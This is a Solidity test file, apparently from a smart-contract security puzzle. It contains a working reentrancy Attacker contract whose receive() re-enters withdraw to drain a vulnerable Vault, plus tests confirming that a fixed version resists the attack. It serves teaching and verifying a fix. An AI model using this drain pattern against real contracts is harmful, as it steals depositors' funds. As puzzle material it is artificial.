// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Vault} from "../src/Vault.sol";
import {VaultFixed} from "../src/VaultFixed.sol";

interface IVault { function deposit() external payable; function withdraw() external; function balances(address) external view returns (uint256); }

contract Attacker {
    IVault public v;
    constructor(IVault _v) { v = _v; }
    function attack() external payable { v.deposit{value: msg.value}(); v.withdraw(); }
    receive() external payable { if (address(v).balance >= 1 ether) v.withdraw(); }
}

contract Puzzle001Test {
    function _setup(IVault v) internal {
        // Honest users deposit 10 ETH.
        v.deposit{value: 10 ether}();
    }

    function _exploit(IVault v) internal returns (uint256 stolen) {
        Attacker a = new Attacker(v);
        a.attack{value: 1 ether}();
        stolen = address(a).balance; // > 1 ether means it took other users' funds
    }

    // 1) The exploit must WORK on the vulnerable contract.
    function test_exploitWorksOnVulnerable() public {
        IVault v = IVault(address(new Vault()));
        _setup(v);
        uint256 stolen = _exploit(v);
        require(stolen > 1 ether, "exploit should drain the vulnerable vault");
    }

    // 2) The same exploit must FAIL on the fixed contract.
    function test_exploitFailsOnFixed() public {
        IVault v = IVault(address(new VaultFixed()));
        _setup(v);
        try this.exploitExternal(v) returns (uint256 stolen) {
            require(stolen <= 1 ether, "fixed vault must not be drained");
        } catch {
            // reverting is also an acceptable failure of the exploit
        }
        require(address(v).balance >= 10 ether, "honest funds must remain");
    }
    function exploitExternal(IVault v) external returns (uint256) { return _exploit(v); }

    // 3) Normal behaviour must work on BOTH versions.
    function test_normalUseVulnerable() public { _normal(IVault(address(new Vault()))); }
    function test_normalUseFixed() public { _normal(IVault(address(new VaultFixed()))); }
    function _normal(IVault v) internal {
        User u = new User(v);
        u.depositAndWithdraw{value: 2 ether}();
        require(address(u).balance == 2 ether, "user gets their deposit back");
        require(v.balances(address(u)) == 0, "balance cleared");
    }

    receive() external payable {}
}

contract User {
    IVault v;
    constructor(IVault _v) { v = _v; }
    function depositAndWithdraw() external payable { v.deposit{value: msg.value}(); v.withdraw(); }
    receive() external payable {}
}
